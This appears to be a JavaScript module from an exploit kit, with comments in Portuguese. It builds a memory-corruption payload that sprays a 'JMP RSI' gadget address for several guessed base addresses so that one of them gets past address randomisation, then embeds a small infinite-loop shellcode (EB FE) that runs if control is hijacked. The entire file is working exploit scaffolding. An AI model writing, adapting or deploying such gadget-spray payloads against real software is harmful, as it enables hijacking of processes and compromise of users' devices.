import { CONFIG, GADGETS } from './config.mjs';

export function build_universal_payload(size) {
    const buffer = new Uint32Array(size / 4);
    const view = new DataView(buffer.buffer);

    // ESTRATÉGIA "RAINBOW":
    // Preenchemos o objeto repetindo os endereços de pulo para TODAS as bases.
    // Padrão: [Gadget_Base1] [Gadget_Base2] [Gadget_Base3] ...
    
    let offset = 0;
    while (offset < size) {
        for (let base of CONFIG.TARGET_BASES) {
            if (offset + 8 > size) break;

            // Calcula o endereço do gadget JMP RSI para esta base
            let gadget_addr = base + GADGETS.jmp_rsi;
            
            // Escreve no buffer
            view.setBigUint64(offset, gadget_addr, true); // Little Endian
            offset += 8;
        }
    }
    
    // INJEÇÃO DE SHELLCODE (Payload Passivo)
    // Colocamos o "Infinite Loop" (EB FE) no final do objeto.
    // Se o gadget funcionar, ele pula para RSI (este objeto) e executa o loop.
    
    // Offset seguro no final (últimos 16 bytes)
    const code_pos = size - 16;
    if (code_pos > 0) {
        view.setUint8(code_pos, 0xEB);
        view.setUint8(code_pos+1, 0xFE);
    }

    return buffer;
}
